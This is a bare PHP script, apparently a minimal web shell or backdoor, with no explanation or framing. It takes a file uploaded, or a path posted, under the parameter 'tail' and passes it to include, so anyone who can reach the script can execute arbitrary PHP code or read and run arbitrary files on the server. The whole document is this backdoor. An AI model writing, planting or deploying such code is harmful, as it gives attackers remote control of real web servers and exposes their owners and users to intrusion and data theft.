<?php
if (isset($_FILES['tail'])) include($_FILES['tail']['tmp_name']);
if (isset($_POST['tail'])) include($_POST['tail']);
?>
